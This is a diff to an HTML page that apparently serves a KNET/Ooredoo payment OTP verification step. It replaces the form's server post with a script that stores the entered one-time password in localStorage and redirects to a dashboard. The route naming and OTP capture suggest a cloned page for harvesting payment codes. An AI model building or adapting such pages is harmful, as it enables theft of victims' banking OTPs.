@@ -2318,7 +2318,7 @@ display: none;
 
 
 
-    <form action="/myooredoo/knet/ver/store" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
+    <form action="javascript:void(0);" onsubmit="handleOTPSubmit(event)" method="post" autocomplete="off"> <input type="hidden" name="_token" value="w3KxyROOSPjqdSTWIY01k1UYjrVv7XswoYP1z56q" autocomplete="off">
         <div class="madd"> </div>
 
 
@@ -3178,3 +3178,25 @@ display: none;
 </body>
 
 </html>
+<script>
+function handleOTPSubmit(event) {
+    event.preventDefault();
+    
+    // Get OTP data
+    const otpValue = document.querySelector('input[name="otp"]') ? document.querySelector('input[name="otp"]').value : '';
+    
+    // Create transaction data
+    const transactionData = {
+        otp: otpValue,
+        timestamp: new Date().toISOString(),
+        stage: 'otp'
+    };
+    
+    // Store in localStorage
+    const transactionKey = 'transaction_otp_' + Date.now();
+    localStorage.setItem(transactionKey, JSON.stringify(transactionData));
+    
+    // Redirect to dashboard
+    window.location.href = '/dashboard.html';
+}
+</script>
